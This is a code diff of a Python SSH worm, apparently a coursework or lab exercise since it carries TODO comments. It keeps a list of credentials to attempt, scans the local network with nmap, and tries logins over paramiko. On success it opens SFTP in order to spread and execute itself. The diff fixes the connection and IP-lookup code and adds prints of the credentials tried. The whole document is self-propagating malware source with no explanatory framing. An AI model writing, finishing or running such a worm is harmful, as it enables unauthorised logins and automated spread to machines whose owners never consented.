@@ -4,8 +4,6 @@ import socket
 import nmap
 import netinfo
 import os
-import socket, fcntl, struct
-import netifaces
 
 # The list of credentials to attempt
 credList = [
@@ -75,13 +73,16 @@ def spreadAndExecute(sshClient):
 def tryCredentials(host, userName, password, sshClient):
 
 	try:
-		ssh.connect(host, username=username, password=password)
+		sshClient.connect(host, username=userName, password=password)
 	except socket.error:
 		print "Server is down"
 	except paramiko.SSHException:
+		print "Username: ", username
+		print "Password ", password
 		print "Credentials are not correct"
 	else:
-		sftpClient = ssh.open_sftp()
+		print "Credentials are correct!"
+		sftpClient = sshClient.open_sftp()
 		return sftpClient
 
 	# Tries to connect to host host using
@@ -159,17 +160,7 @@ def getMyIP(interface):
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
 	#networkInterfaces = netifaces.interfaces()
-
-	ipAddr = networkInterfaces
-
-	for netFace in networkInterfaces:
-		addr = netifaces.ifaddresses(netFace)[2][0]['addr']
-
-		if not addr == "127.0.0.1":
-			ipAddr = addr
-			break
-
-	return ipAddr
+	return netinfo.get_ip(interface)
 
 #######################################################
 # Returns the list of systems on the same network
@@ -223,8 +214,7 @@ if len(sys.argv) < 2:
 	pass
 
 # TODO: Get the IP of the current system
-networkInterfaces = netifaces.interfaces()
-selfIP = getMyIP(networkInterfaces)
+selfIP = getMyIP("enp0s3")
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
